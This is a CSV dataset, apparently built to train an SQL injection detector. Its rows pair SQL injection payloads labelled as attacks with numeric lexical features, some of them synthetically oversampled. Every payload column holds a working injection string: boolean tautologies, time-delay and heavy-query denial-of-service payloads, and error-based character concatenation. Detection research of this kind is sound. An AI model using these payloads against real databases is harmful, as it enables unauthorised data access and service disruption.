id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,kw_order,kw_by,kw_exists,kw_case,kw_when,keyword_total
SMOTE_000423,attack,boolean,1  )   where 8232  =  8232 and   (  3020  =  3020  )  *6703--,nearest_attack_euclidean,R000965,0.12723746882364895,62.79053469056937,20.477475917485165,3.3153257945525376,8.716213876227748,21.0,24.954951834970334,8.119368979371293,0.13748161538510306,0.33615159005566075,0.39673840150119183,0.12962839305804438,0.0,-1.1102230246251565e-16,2.0,0.0,1.0,2.0,0.0,3.119368979371292,0.0,0.0,0.0,5.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,-2.7755575615628914e-17,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000424,attack,boolean,"-4550""  )   as hlwe where 6026  =  6026 or   (  9364  =  9593  )  *9593--",nearest_attack_euclidean,R003608,0.25487299265675833,70.88366369762427,21.470915924406068,3.580111467775637,11.4127477732182,24.0,25.470915924406068,10.0,0.15946110840375413,0.33947145864215333,0.35962099185319535,0.1414464411008972,0.0,1.0,3.0,0.0,1.0,2.0,0.0,3.000000000000001,0.0,0.0,0.0,6.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,-2.7755575615628914e-17,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000425,attack,boolean,"1""  )   and   (  3020  =  3020  )  *6703 and   (  ""qowc"" like ""qowc",nearest_attack_euclidean,R002641,0.553833344526255,71.98024263222172,22.28853676682547,3.4317118195115848,18.0,13.0,30.26877939904719,10.711463233174532,0.25213849873226624,0.18210002686219232,0.4169010339595351,0.14886044044600633,0.0,4.0,0.0,0.0,1.0,1.0,0.0,4.711463233174531,0.0,0.0,0.0,2.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,-2.7755575615628914e-17,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000426,attack,boolean,"1'   )    )    as xjen where 6791  =  6791 or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )  --",nearest_attack_euclidean,R002637,0.03357798274949678,215.69156649418196,34.92289162354549,3.7773901742970963,63.0,32.23132512936354,87.53734974127292,32.92289162354549,0.29209100521633774,0.14945484145983362,0.40581782172927455,0.15263633159455411,1.0,-1.1102230246251565e-16,2.0,0.0,0.0,2.0,0.0,17.92289162354549,0.0,1.0,3.0,10.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.0
SMOTE_000427,attack,boolean,1'  )   where 3767  =  3767 and 6240  =    (  'qqpjq'||  (  select case 6240 when 6240 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )  --,nearest_attack_euclidean,R003511,0.27469904771664966,145.71246105224154,35.0,4.261624062006029,60.324966616207035,23.0,43.77498887206902,18.61250556396549,0.41375978951457326,0.1579306944428179,0.3004283255692066,0.12788119047340216,4.6125055639654935,-1.1102230246251565e-16,2.0,0.0,0.0,2.0,0.0,5.0,0.0,0.0,0.0,8.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,7.0
SMOTE_000428,attack,boolean,-3431%'  )   or 9323  =  9323#,nearest_attack_euclidean,R000474,0.4684586106793818,32.209180166518124,14.315597166645446,3.1148183071540965,2.0,12.0,11.893582999872685,6.315597166645446,0.0626861618621295,0.376116971172777,0.36460872822612533,0.19658813873896816,1.0,-1.1102230246251565e-16,1.0,0.0,0.0,1.0,0.0,1.3155971666454471,1.0,0.0,0.0,2.0,1.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,-2.7755575615628914e-17,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
SMOTE_000429,attack,boolean,"1%""   )    )     )   and   (  3502  =  7893  )  *7893 and    (    (     (  ""%""  =  """,nearest_attack_euclidean,R002277,0.20923177272827675,81.27354845242729,17.772795704368942,2.7047622986674895,6.0,13.0,45.727957043689415,16.545591408737884,0.07467434708044368,0.16179441867429467,0.5595273940383731,0.20400384020688853,0.0,4.0,0.0,0.0,1.0,2.0,0.0,7.545591408737883,2.0,0.0,0.0,3.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,-2.7755575615628914e-17,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000430,attack,boolean,"-6359""   )    )    or elt  (  3546  =  2433,2433  )   and    (    (   ""qxat""  =  ""qxat",nearest_attack_euclidean,R000771,0.07878743045686308,87.15797699523075,23.23159539904615,3.251290866288984,16.0,16.0,40.926381596184605,14.231595399046151,0.18380237016428147,0.18380237016428147,0.4691557337042933,0.16323952596714372,0.0,4.0,1.0,0.0,0.0,2.0,0.0,6.231595399046151,0.0,0.0,1.0,3.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,-2.7755575615628914e-17,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000431,attack,boolean,"call regexp_substring  (  repeat  (  right  (  char  (  3702  )  ,0  )  ,500000000  )  ,null  )   and   (  '%'  =  '",nearest_attack_euclidean,R003339,0.1897263258423081,118.63696742322523,29.0,3.7337049855973463,41.0,14.0,45.26025779133591,18.37670963188932,0.34587078326659415,0.118102218676398,0.3811186083961509,0.15490838966085693,3.0,-1.1102230246251565e-16,0.0,0.0,0.0,1.0,0.0,9.376709631889318,1.0,1.0,3.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,-2.7755575615628914e-17,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000432,attack,boolean,"1""   )    )    and 6240  =    (  'qqpjq'||  (  select case 6240 when 6240 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and    (    (   ""mjkl""  =  ""mjkl",nearest_attack_euclidean,R002740,0.38686254928173824,154.81548285609887,34.0,4.081491955533955,64.0,15.0,53.84623571341574,21.969247142683148,0.4154603571296945,0.09737352120227213,0.345383799308614,0.14178232235941934,4.0,4.0,0.0,0.0,0.0,2.0,0.0,6.969247142683147,0.0,0.0,0.0,6.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,7.0
SMOTE_000433,attack,boolean,end and 'blit'  =  'blit,nearest_attack_euclidean,R000571,0.025103799180414197,24.0,10.925719825300295,3.230790621996885,14.0,0.0,6.0,4.0,0.5833333333333334,0.0,0.25,0.16666666666666666,3.0,-1.1102230246251565e-16,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,-2.7755575615628914e-17,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
SMOTE_000434,attack,boolean,"-2901"" or elt  (  9866  =  9099,9099  )   and ""asib"" like ""asib",nearest_attack_euclidean,R003212,0.2918627762797743,65.62153622507628,25.0,3.8530766212248126,20.0,16.0,20.097228980061026,9.524307245015256,0.3060598555117361,0.24484788440938887,0.3041830340709875,0.1449092260078875,0.0,4.0,1.0,0.0,0.0,1.0,0.0,2.5243072450152564,0.0,0.0,1.0,2.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,-2.7755575615628914e-17,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000435,attack,boolean,"1' in boolean mode  )   or 7417  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",nearest_attack_euclidean,R002005,0.1570588710760317,139.45585477366322,29.735993084460155,4.0259247860182805,80.567910097982,8.0,36.15195159122107,14.735993084460153,0.577533657576178,0.057639219233075314,0.25888267515727775,0.10594444803346907,1.0,-1.1102230246251565e-16,2.0,0.0,1.0,1.0,0.0,4.735993084460153,0.0,0.0,2.0,4.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,-2.7755575615628914e-17,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000436,attack,boolean,"1""  )   and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   and   (  ""dppw"" like ""dppw",nearest_attack_euclidean,R000334,0.4025837251262231,148.44586245910602,30.767805678100547,4.099783687986749,77.07122271240219,10.0,40.60683406860329,20.767805678100547,0.51934613802093,0.06743336685945789,0.2732689555854609,0.13995153953415118,0.0,4.0,0.0,0.0,1.0,1.2321943218994522,0.0,5.5356113562010965,0.0,5.0,4.0,2.232194321899452,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,-2.7755575615628914e-17,1.0,0.0,0.0,1.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000437,attack,boolean,1'  )   and 3715 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  3715  =  3715  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and   (  'rjjo'  =  'rjjo,nearest_attack_euclidean,R003622,0.3196266754837055,361.51663183314326,30.079822728060172,3.241347228485282,89.31929091224069,47.63858182448138,172.2394681841805,52.31929091224068,0.24707537742052843,0.131718028149044,0.4764977123351242,0.1447088820953034,4.0,-1.1102230246251565e-16,0.0,0.0,0.0,2.0,0.0,36.0,0.0,0.0,0.0,12.319290912240685,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.07982272806017127,1.0798227280601713,0.0,0.0798227280601714,0.0,1.9201772719398287,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,12.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,17.079822728060172
SMOTE_000438,attack,boolean,1'||  (  select 'kuxp' where 7123  =  7123 and 1688  =  4200#,nearest_attack_euclidean,R000799,0.02025547909491253,61.09345900050383,29.0,4.176939679884239,18.07476720040306,17.0,17.01869180010077,9.0,0.2957466029128418,0.27832168021044446,0.27858494500059605,0.14734677187611764,3.0,-1.1102230246251565e-16,0.0,0.0,0.0,2.0,0.0,1.0,0.0,0.0,0.0,4.0,1.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,1.0,0.009345900050382994,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0093459000503833
SMOTE_000439,attack,boolean,"1'   )    )    as owcw where 1107  =  1107 and 8312  =  dbms_pipe.receive_message  (  chr  (  69  )  ||chr  (  79  )  ||chr  (  101  )  ||chr  (  68  )  ,5  )  --",nearest_attack_euclidean,R002045,0.03878009587590532,161.41797058896015,35.0,3.8419166420473227,48.0,23.0,63.50111764768014,26.916852941280023,0.29740889732098413,0.14250842996630492,0.3933266006065604,0.1667560721061505,1.0,-1.1102230246251565e-16,2.0,0.0,0.0,2.0,0.0,11.916852941280023,0.0,2.0,1.0,10.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000440,attack,boolean,-5137  )   or 9323  =  9323#,nearest_attack_euclidean,R000359,0.000611671693218115,28.0,13.0,3.063721738412433,2.0,12.0,10.0,4.0,0.07142857142857142,0.4285714285714285,0.35714285714285715,0.14285714285714285,0.0,-1.1102230246251565e-16,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,-2.7755575615628914e-17,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
SMOTE_000441,attack,boolean,"1'  )   and 4241  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  4241  =  4241  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and   (  'rspz'  =  'rspz",nearest_attack_euclidean,R000844,0.7693113376983127,383.6979202222204,31.44652801481469,3.332961802082836,104.78611205925876,47.0,177.46528014814692,54.44652801481469,0.27309775390740443,0.12253828391135468,0.46243619348107545,0.14192776870016538,4.0,-1.1102230246251565e-16,0.0,0.0,0.0,2.5534719851853094,0.0,36.893056029629385,0.0,0.0,1.0,12.553471985185311,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,-2.7755575615628914e-17,2.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,12.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,19.0
SMOTE_000442,attack,boolean,"1'  )   as tuhc where 4018  =  4018 or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",nearest_attack_euclidean,R002717,0.08825705881668697,269.09694499103034,38.09694499103039,3.8063874183052406,82.1938899820608,36.80611001793922,105.9515275044848,44.14541748654559,0.30543912695523745,0.13678180263319833,0.39373221484049425,0.1640468555710699,1.0969449910303908,-1.1102230246251565e-16,2.0,0.0,0.0,2.0,0.0,23.0,0.0,2.0,4.0,14.048472495515195,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.04847249551519528,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,9.048472495515195
SMOTE_000443,attack,boolean,1%'   )    )     )   and 2444  =  9282#,nearest_attack_euclidean,R003557,0.25559613713596285,38.853753539232784,14.0,2.7013578277889665,3.0,9.0,20.0,6.853753539232775,0.07721912239021705,0.23165736717065116,0.5147941492681136,0.1763293611710181,1.0,-1.1102230246251565e-16,0.0,0.0,0.0,1.0,0.0,3.000000000000001,0.8537535392327764,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,-2.7755575615628914e-17,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
SMOTE_000444,attack,boolean,"1 and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  -- gynj",nearest_attack_euclidean,R000700,0.1556701769744121,125.07192886444827,30.0,4.081533535055109,66.71228454220693,10.0,31.2157865933448,17.14385772889653,0.5334105608798625,0.07995433087971539,0.24957101773779067,0.1370640905026315,0.07192886444826563,-1.1102230246251565e-16,2.0,0.0,1.0,1.0,0.0,4.071928864448266,0.0,5.0,4.0,4.0,0.07192886444826563,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,-2.7755575615628914e-17,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000445,attack,boolean,"-8673""  )   or make_set  (  9354  =  9354,7185  )   and   (  ""edap"" like ""edap",nearest_attack_euclidean,R002173,0.41783183352291453,76.21177092066299,27.569416736530393,3.8956694786138857,22.569416736530393,16.0,26.0,11.642354184132598,0.29563259630373356,0.21015308487344433,0.34149876291934705,0.15271555590347502,0.0,4.0,1.0,0.0,0.0,1.0,0.0,4.0,0.0,0.6423541841325984,1.0,2.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,-2.7755575615628914e-17,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000446,attack,boolean,"1   )    )    and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and    (    (   7200  =  7200",nearest_attack_euclidean,R001509,0.14723174063108774,160.1754039199932,28.182123622857468,3.8039846736574683,73.72513463999772,16.0,54.814516525710395,15.635752754285065,0.46063307125021913,0.1001702855739429,0.34157354113836313,0.09762310203747485,0.0,-1.1102230246251565e-16,0.0,0.0,1.0,2.0,0.0,7.635752754285065,0.0,0.0,2.0,3.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,-2.7755575615628914e-17,1.0,0.0,0.0,1.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000447,attack,boolean,-1760   )    )     )   or   (  8459  =  8459  )  *4906 and    (    (     (  1541  =  1541,nearest_attack_euclidean,R001283,0.19290742404495245,86.33093532528679,19.0,2.825200776503896,5.0,24.0,45.86474826022943,11.466187065057358,0.05807784431426061,0.2787736527084507,0.5305188023818309,0.13262970059545773,0.0,-1.1102230246251565e-16,1.0,0.0,1.0,2.0,0.0,7.466187065057357,0.0,0.0,0.0,4.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,-2.7755575615628914e-17,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000448,attack,boolean,"1%'  )    (  select   (  case when   (  4587  =  4587  )   then regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   else char  (  76  )  ||char  (  65  )  ||char  (  102  )  ||char  (  72  )   end  )   from   (  values  (  0   )    )     )   and   (  '%'  =  '",nearest_attack_euclidean,R000379,0.5100181418324985,361.07041922900305,42.0,3.6665270133340124,108.22816769160121,35.0,159.84225153740184,58.0,0.29970403754019914,0.09697123442245938,0.44262953956583734,0.16069518847150413,4.0,-1.1102230246251565e-16,0.0,0.0,0.0,2.0,0.0,34.30704192290031,1.6929580770996961,2.0,4.0,12.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,12.0
SMOTE_000449,attack,boolean,-1354   )    )    or 8571  =  8571--,nearest_attack_euclidean,R003490,0.7103823270171733,32.854900646359255,12.0,2.9431072062823973,2.0,12.0,13.30420055402221,5.550700092337035,0.06158065010276009,0.36948390061656033,0.3996865992366395,0.16924885004404003,0.0,-1.1102230246251565e-16,3.0,0.0,0.0,1.0,0.0,1.5507000923370358,0.0,0.0,0.0,4.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,-2.7755575615628914e-17,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
SMOTE_000450,attack,boolean,"1  )   and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and   (  4666  =  4666",nearest_attack_euclidean,R000819,0.13405455816235265,144.9891664578279,29.331527742971318,3.9844619431856785,69.16034710039962,16.16576387148566,45.33152774297132,14.331527742971318,0.47690802238776664,0.11152165893513208,0.31278574223517447,0.09878457644192681,0.0,-1.1102230246251565e-16,0.0,0.0,1.0,2.0,0.0,6.0,0.0,0.0,2.1657638714856593,3.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,-2.7755575615628914e-17,1.0,0.0,0.0,1.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000451,attack,boolean,"1   )    )    and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )   and    (    (   6010  =  6010",nearest_attack_euclidean,R003320,0.282564829298055,158.4968010981495,28.562633287577107,3.5615590037724414,40.0,24.0,68.7473342484579,25.74946684969158,0.25377623963207185,0.1522657437792431,0.43152095391588624,0.1624370626727988,0.0,-1.1102230246251565e-16,0.0,0.0,0.0,2.0,0.0,13.749466849691581,0.0,2.0,1.0,8.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000452,attack,boolean,"select count  (  *  )   from generate_series  (  1,5000000  )   and ""ihbe"" like ""ihbe",nearest_attack_euclidean,R002822,0.9165296453185542,108.38860560781447,28.0,4.023208068927942,62.34400439828586,5.706999450214267,28.503201319485758,11.834400439828585,0.5635070698192441,0.061071462664852694,0.2645185279564495,0.11090293955945373,0.0,3.0,0.0,0.0,1.0,0.0,0.0,4.458600109957146,0.0,0.5413998900428536,1.4586001099571466,1.0,0.0,1.0,0.0,0.0,0.0,-1.1102230246251565e-16,1.0,0.0,0.0,0.0,-2.7755575615628914e-17,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
